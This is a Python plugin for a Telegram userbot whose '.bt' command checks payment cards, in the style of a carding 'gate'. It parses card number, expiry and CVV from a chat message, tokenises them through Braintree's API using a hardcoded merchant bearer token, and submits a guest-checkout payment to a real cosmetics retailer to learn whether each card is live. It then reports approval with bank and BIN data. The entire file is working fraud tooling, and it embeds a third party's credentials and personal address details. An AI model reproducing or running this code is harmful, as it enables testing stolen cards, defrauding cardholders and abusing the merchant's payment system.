import httpx
import time
import re as regex
import json

from datetime import datetime
from telethon import events
from ubb import Ubot
from ..func import http
from ..func.schk import is_sudo


@Ubot.on(events.NewMessage(pattern=r'\.bt'))
async def bt_charge(event):
    cc = event.message.message[len('.bt '):]
    reply_msg = await event.get_reply_message()
    if reply_msg:
        cc = reply_msg.message
   # if not await is_sudo(user_id=event.sender_id):
   #   return await event.reply("**You gey nut sudo**")
    ed = await event.respond("**vibe chutiyaaa**")
    x = regex.findall(r'\d+', cc)
    ccn = x[0]
    mm = x[1]
    yy = x[2]
    cvv = x[3]
    VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '65', '6011')
    if not ccn.startswith(VALID):
        return await ed.edit('**Invalid CC Type**')
    start = time.time()
    
    async with httpx.AsyncClient() as client:
        headers = {
        "Braintree-Version": "2018-05-10",
        "Accept-Language": "en-US,en;q=0.9",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Mobile Safari/537.36",
        "Accept": "*/*",
        "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2NTYwNDcxMzksImp0aSI6IjkzYTA5YTRjLTQ5MjUtNGVjMi1iM2QxLWQ5Njg4Nzg4MzgxNiIsInN1YiI6IjRkYzYycnFxY3BiNWZqenAiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjRkYzYycnFxY3BiNWZqenAiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiYXVndXN0aW51c2JhZGVyVVNEIn19.4suHWImK7jiD51gkF_AKKgl_J-ZWRUecsYVAFVup0zEDn8JgSfIus9t-n53_IJP8caWaFMaKus1cVaTuhx7KHQ",
        "Content-Type": "application/json"
        }
        payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "dropin2",
                "sessionId": "70d5ca69-73ce-4db2-b88a-523c31a09998"
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": ccn,
                        "expirationMonth": mm,
                        "expirationYear": yy,
                        "cvv": cvv,
                        "billingAddress": {
                            "postalCode": "A1A1A1"
                        }
                    },
                    "options": {
                        "validate": "false"
                    }
                }
            },
            "operationName": "TokenizeCreditCard"
        }
        r = await client.post('https://payments.braintree-api.com/graphql', headers=headers, json=payload)
        print(r.text)
        token = r.json()['data']['tokenizeCreditCard']['token']
        head = {
            "x-newrelic-id": "VgQGUV5RCxACXVdbBwMHVlw=",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json",
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9"
            }
        parms = {
            "cartId": "UoC9vnB7k0ow28yQGsbzZCZyGhy4x9La",
            "billingAddress": {
                "countryId": "GB",
                "region": "",
                "street": [
                    "Lon",
                    "Pennant"
                ],
                "company": "",
                "telephone": "3546978",
                "postcode": "SY23 5PA",
                "city": "Llanon",
                "firstname": "Nikhil",
                "lastname": "Kumar",
                "saveInAddressBook": None,
            },
            "paymentMethod": {
                "method": "braintree",
                "additional_data": {
                    "payment_method_nonce": token,
                    "device_data": "{\"device_session_id\":\"3b23960e2998a82692cc78fff71bbc39\",\"fraud_merchant_id\":\"604137\",\"correlation_id\":\"fea5d7091a3c061ff8a81f97465b49eb\"}"
                }
            },
            "email": "niksyead@gmail.com"
        }
        res = await client.post('https://augustinusbader.com/int/en/rest/inten/V1/guest-carts/UoC9vnB7k0ow28yQGsbzZCZyGhy4x9La/payment-information', headers=head, json=parms)
        MSG = res.json()['message']
        B = await http.get(f'http://binchk-api.vercel.app/bin={ccn[:6]}')
        BE = B.json()
        end = time.time()
        
        if 'CVV' in res.text:
            await ed.edit(f'◤✅**CC**⇝ `{ccn}|{mm}|{yy}|{cvv}`\n'+
                          f'╠**RESULT**⇝ `{MSG}`\n'+
                          f'╠**Gate⇝ Braintree 69£**\n'+
                          f'╠**BIN-INFO⤵**\n'+
                          f'╠**{BE["brand"]} - {BE["type"]} **\n'+
                          f'╠**Bank↬ {BE["bank"]}**\n'+
                          f'╠**Country↬ {BE["code"]}({BE["flag"]})**\n'+
                          f'╠**Time-Took**⇝ {end-start:0.2f}\n'+
                          f'⟿**Userbot-By**⇝ @Xbinner◢')

        elif res.status_code == 200:
            await ed.edit(f'◤✅**CC**⇝ `{ccn}|{mm}|{yy}|{cvv}`\n'+
                          f'╠**RESULT**⇝ `Approved`\n'+
                          f'╠**Gate**⇝ Braintree 69£\n'+
                          f'╠**BIN-INFO⤵**\n'+
                          f'╠**{BE["brand"]} - {BE["type"]} **\n'+
                          f'╠**Bank↬ {BE["bank"]}**\n'+
                          f'╠**Country↬ {BE["code"]}({BE["flag"]})**\n'+
                          f'╠**Time-Took**⇝ {end-start:0.2f}\n'+
                          f'⟿**Userbot-By**⇝ @Xbinner◢')
        else:
            await ed.edit(f'◤❌**CC**⇝ `{ccn}|{mm}|{yy}|{cvv}`\n'+
                          f'╠**RESULT**⇝ `{MSG}`\n'+
                          f'╠**Gate**⇝ Braintree 69£\n'+
                          f'╠**BIN-INFO⤵**\n'+
                          f'╠**{BE["brand"]} - {BE["type"]} **\n'+
                          f'╠**Bank↬ {BE["bank"]}**\n'+
                          f'╠**Country↬ {BE["code"]}({BE["flag"]})**\n'+
                          f'╠**Time-Took**⇝ {end-start:0.2f}\n'+
                          f'⟿**Userbot-By** ⇝ @Xbinner◢')
